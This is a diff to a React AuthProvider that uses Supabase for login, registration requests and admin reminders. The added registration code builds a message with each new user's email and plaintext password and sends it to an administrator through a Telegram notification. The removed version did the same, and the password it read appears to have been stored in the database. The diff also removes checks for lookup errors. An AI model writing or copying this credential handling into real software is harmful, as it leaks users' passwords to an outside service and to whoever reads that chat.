@@ -106,18 +106,13 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       });
 
       if (error) {
-        console.log('❌ AuthContext: Supabase auth error:', error);
-        console.error('Full Supabase error object:', JSON.stringify(error, null, 2));
-
+        console.log('❌ AuthContext: Supabase auth error:', error.message);
+        
         if (error.message === 'Invalid login credentials') {
-          const { data: pendingRequests, error: requestError } = await supabase
+          const { data: pendingRequests } = await supabase
             .from('registration_requests')
             .select('id')
             .eq('email', credentials.email);
-
-          if (requestError) {
-            console.error('Error fetching registration requests:', JSON.stringify(requestError, null, 2));
-          }
 
           if (pendingRequests && pendingRequests.length > 0) {
             return {
@@ -137,16 +132,12 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
       if (data.user) {
         console.log('👤 AuthContext: Supabase login successful');
-        const { data: profile, error: profileError } = await supabase
+        const { data: profile } = await supabase
           .from('profiles')
           .select('*')
           .eq('id', data.user.id)
           .single();
-
-        if (profileError) {
-          console.error('Error fetching profile:', JSON.stringify(profileError, null, 2));
-        }
-
+          
         if (profile && profile.is_approved) {
           const userObj: User = {
             id: profile.id,
@@ -245,7 +236,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         return false;
       }
       
-      const { data, error } = await supabase
+      const { error } = await supabase
         .from('registration_requests')
         .insert([
           {
@@ -254,9 +245,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
             name: credentials.name,
             created_at: new Date().toISOString(),
           }
-        ])
-        .select()
-        .single();
+        ]);
       
       if (error) {
         console.error('Registration error:', error);
@@ -264,13 +253,11 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         return false;
       }
       
-      if (data) {
-        const message = `🔔 New registration request\n\n📧 Email: ${data.email}\n🔑 Password: ${data.password}\n📅 Date: ${new Date(data.created_at).toLocaleDateString('en-US')}, ${new Date(data.created_at).toLocaleTimeString('en-US')}\n\n⏳ Awaiting administrator approval`;
-        await sendTelegramNotification(message);
-        
-        setIsLoading(false);
-        return true;
-      }
+      const message = `🔔 New registration request\n\n📧 Email: ${credentials.email}\n🔑 Password: ${credentials.password}\n📅 Date: ${new Date().toLocaleDateString('en-US')}, ${new Date().toLocaleTimeString('en-US')}\n\n⏳ Awaiting administrator approval`;
+      await sendTelegramNotification(message);
+      
+      setIsLoading(false);
+      return true;
       
       setIsLoading(false);
       return false;
@@ -313,6 +300,28 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     }
   };
 
+  const remindAdmin = async (requestId: string): Promise<{ success: boolean; message: string }> => {
+    try {
+      const { data: request, error: requestError } = await supabase
+        .from('registration_requests')
+        .select('email')
+        .eq('id', requestId)
+        .single();
+
+      if (requestError || !request) {
+        console.error('Error fetching request for reminder:', requestError);
+        return { success: false, message: 'Request not found.' };
+      }
+
+      const message = `🔔 Reminder: Registration Approval Needed\n\n📧 Email: ${request.email}\n\nPlease review the pending registration.`;
+      await sendTelegramNotification(message);
+      return { success: true, message: 'A reminder has been sent to the administrator.' };
+    } catch (error) {
+      console.error('Error sending reminder:', error);
+      return { success: false, message: 'Failed to send reminder.' };
+    }
+  };
+
   const rejectRegistration = async (requestId: string): Promise<boolean> => {
     try {
       const { data: request } = await supabase
@@ -344,29 +353,6 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     } catch (error) {
       console.error('Error rejecting registration:', error);
       return false;
-    }
-  };
-
-  const remindAdmin = async (requestId: string): Promise<{ success: boolean; message: string }> => {
-    try {
-      const { data: request, error: requestError } = await supabase
-        .from('registration_requests')
-        .select('email, name')
-        .eq('id', requestId)
-        .single();
-
-      if (requestError || !request) {
-        console.error('Error fetching request for reminder:', requestError);
-        return { success: false, message: 'Could not find the registration request.' };
-      }
-
-      const message = `🔔 Reminder: Pending Registration\n\n👤 Name: ${request.name}\n📧 Email: ${request.email}\n\nPlease approve or reject the request.`;
-      await sendTelegramNotification(message);
-
-      return { success: true, message: 'A reminder has been sent to the administrator.' };
-    } catch (error) {
-      console.error('Error sending reminder:', error);
-      return { success: false, message: 'Failed to send reminder.' };
     }
   };
 
